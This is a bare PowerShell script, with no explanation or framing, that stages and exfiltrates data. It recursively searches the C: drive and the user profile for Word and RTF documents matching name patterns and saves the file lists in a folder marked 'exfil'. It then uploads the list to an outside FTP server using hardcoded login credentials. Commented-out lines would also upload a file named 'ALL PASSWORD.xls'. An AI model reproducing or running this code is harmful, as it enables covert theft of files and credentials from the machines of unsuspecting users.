New-Item -ItemType Directory -Force -Path C:\Microsoft\Windows\Desktop\Privdata\lifxe
$ScriptDir = "C:\Microsoft\Windows\Desktop\Privdata\lifxe"
Get-Childitem "C:\" -recurse -filter "*X*.docx" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem "C:\" -recurse -filter "*X*.doc" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem "C:\" -recurse -filter "*X*.rtf" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem $env:UserProfile -recurse -filter "*Xii*.docx" | Out-File -Append "$ScriptDir\exfil_list_data_xii.txt"
$FilePathLIST="$ScriptDir\exfil_list_data.txt"
$FilePathLIST_X="$ScriptDir\exfil_list_data_xii.txt"
$FilePathpass="C:\ALL PASSWORD.xls"
$Username = "b7_19204341"
$Password = "wpzhj2x8"

$RemoteFile = "ftp://ftp.byethost7.com/htdocs/exfilterated.txt"
$FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
$FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
$FTPRequest.UseBinary = $true
$FTPRequest.UsePassive = $true
#$FileContent = gc -en byte $FilePathpass
#$FTPRequest.ContentLength = $FileContent.Length
#$Run = $FTPRequest.GetRequestStream()
#$Run.Write($FileContent, 0, $FileContent.Length)
$FileContent = gc -en byte $FilePathLIST
$FTPRequest.ContentLength = $FileContent.Length
$Run = $FTPRequest.GetRequestStream()
$Run.Write($FileContent, 0, $FileContent.Length)
#$FileContent = gc -en byte $FilePathLIST_X
#$FTPRequest.ContentLength = $FileContent.Length
#$Run = $FTPRequest.GetRequestStream()
#$Run.Write($FileContent, 0, $FileContent.Length)
$Run.Close()
$Run.Dispose()
exit
